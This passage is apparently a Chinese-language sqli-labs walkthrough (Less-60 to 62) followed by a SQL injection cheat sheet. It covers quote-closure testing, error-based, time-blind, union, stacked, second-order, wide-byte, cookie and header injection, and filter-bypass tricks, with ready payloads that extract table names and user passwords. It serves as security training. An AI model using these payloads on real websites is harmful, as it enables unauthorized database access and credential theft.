?id=1" --+报错

?id=1" and 1=1 --+ 报错

?id=1" and "1"="1   正常

?id=1" and ”1“=”2   不正常

判断使用（“”）闭合

利用手法与上述相同

更改闭合

## 0X41Less-61

更改闭合

?id=1'))

payload:

?id=-1')) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+

其余相同

## 0X42Less-62

?id=1  正常 

?id=1' 不正常 无报错 

……均无报错信息

延时注入

?id=1'） and sleep(5)   延时   判断’）闭合

?id=1" and sleep(5)…… 均无效



?id=1'） and if(left(database(),1)='c' , sleep(3), 1) --+     库名第一位是c

?id=1')  and if (left(database(),10)='challenges'  ,sleep(4),1)--+

![image-20201113131718665](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113131718665.png)

猜解库名 challenges

爆表payload

```
?id=1') and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' , sleep(3), 1) --+
```



爆字段payload

```
?id=1' and if(left((select column_name from information_schema.columns where table_name='xxxx' limit 4,1),8)='password', sleep(3), 1) --+
?id=1' and if(left((select column_name from information_schema.columns where table_name='xxxx' limit 9,1),8)='username', sleep(3), 1) --+
```

爆值payload

```
?id=1' and if(left((select password from users order by id limit 0,1),4)='xxxx' , sleep(3), 1) --+
```



## 0X43总结

**SQL注入的分类**

**按变量类型分**

- 数字型
- 字符型

**按HTTP提交方式分**

- GET注入
- POST注入
- Cookie注入

**按注入方式分**

- 报错注入
- 盲注
  - 布尔盲注
  - 时间盲注
- union注入

**编码问题**

- 宽字节注入





**MySQL 5.0以上和MySQL 5.0以下版本的区别**

MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库--**INFORMATION_SCHEMA** ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。

**information_schema**

系统数据库，记录当前数据库的数据库，表，列，用户权限等信息

**SCHEMATA**

储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等

**TABLES**

储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等

**COLUMNS**

储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等





**基本手工注入流程**

要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。

**1. MySQL >= 5.0**

（1）获取字段数

```
order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/
```

（2）获取系统数据库名

在MySQL >5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中

```
select null,null,schema_name from information_schema.schemata
```

（3）获取当前数据库名

```
select null,null,...,database()
```

（4）获取数据库中的表

```
select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()
```

或

```
select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
```

（5）获取表中的字段

这里假设已经获取到表名为user

```
select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
```

（6）获取各个字段值

这里假设已经获取到表名为user，且字段为username和password

```
select null,group_concat(username,password) from users
```

**2.MySQL < 5.0**

MySQL < 5.0 没有信息数据库**information_schema**，所以只能手工枚举爆破（二分法思想）。

该方式通常用于盲注。

相关函数

**length(str)** ：返回字符串str的长度

**substr(str, pos, len)** ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

**mid(str,pos,len)** ：跟上面的一样，截取字符串

**ascii(str)** ：返回字符串str的最左面字符的ASCII代码值

**ord(str)** ：将字符或布尔类型转成ascll码

**if(a,b,c)** ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

**（1）基于布尔的盲注**

```
and ascii(substr((select database()),1,1))>64 /*判断数据库名的第一个字符的ascii值是否大于64*/
```

**（2）基于时间的盲注**

```
id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/
```





**常用注入方式**

注释符：

```
#
-- (有空格)或--+
/**/
```

内联注释：

```
/*！...*/
```

**union注入**

```
id =-1 union select 1,2,3   /*获取字段*/
```

**Boolean注入**

```
id=1' substr(database(),1,1)='t'--+     /*判断数据名长度*/
```

**报错注入**

1 floor()和rand()

```
union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/
```

2 extractvalue()

```
id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
```

3 updatexml()

```
id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
```

4 geometrycollection()

```
id=1 and geometrycollection((select * from(select * from(select user())a)b))
```

5 multipoint()

```
id=1 and multipoint((select * from(select * from(select user())a)b))
```

6 polygon()

```
id=1 and polygon((select * from(select * from(select user())a)b))
```

7 multipolygon()

```
id=1 and multipolygon((select * from(select * from(select user())a)b))
```

8 linestring()

```
id=1 and linestring((select * from(select * from(select user())a)b))
```

9 multilinestring()

```
id=1 and multilinestring((select * from(select * from(select user())a)b))
```

10 exp()

```
id=1 and exp(~(select * from(select user())a))
```

**时间注入**

```
id = 1 and if(length(database())>1,sleep(5),1)
```

**堆叠查询注入**

```
id = 1';select if(sub(user(),1,1)='r',sleep(3),1)%23
```

**二次注入**

假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test'，接下来访问xxx.php?username=test'，页面返回id=22；

接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。

访问xxx.php?id=test' union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。

**宽字节注入**

**利用条件**：

查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数

数据库的编码为GBK

**利用方式**

```
id = -1%DF' union select 1,user(),3,%23
```

在上述条件下，单引号'被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。

**Cookie注入**

当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。

```
Cookie: id = 1 and 1=1
```

**base64注入**

对参数进行base64编码，再发送请求。

说明：id=1'，1的base64编码为`MSc=`，而`=`的url编码为`%3d`，所以得到以下结果：

```
id=MSc%3d
```

**XFF注入**

XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址

```
X-Forward-For：127.0.0.1' select 1,2,user()
```







**SQL注入绕过技术**

- **大小写绕过**

- **双写绕过**

- **编码绕过**（url全编码、十六进制）

- **内联注释绕过**

- **关键字替换**

  - ```
    - **逗号绕过**
    
      substr、mid()函数中可以利用from to来摆脱对逗号的利用；
    
      limit中可以利用offset来摆脱对逗号的利用
    
    - **比较符号( >、< )绕过**（greatest、between and)
    
    - **逻辑符号的替换**（and=&& or=|| xor=| not=!）
    
    - **空格绕过**（用括号，+等绕过）
    ```

    

- **等价函数绕过**

  - hex()、bin()=ascii()
  - concat_ws()=group_concat()
  - mid()、substr()=substring()

- **http参数污染**（`id=1 union select+1,2,3+from+users+where+id=1–`变为`id=1 union select+1&id=2,3+from+users+where+id=1–`）



## 0X44 Tips

因为双引号内的部分被当做了字符串 而非表示字符串的引号，也就是说双引号里面你再多些几个单引号，对称与否都不影响,在测试闭合时如果添加单引号，括号都可顺利执行时，可考虑双引号闭合（输入导致双引号未闭合时依旧报错。）



![image-20201113180213837](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113180213837.png)

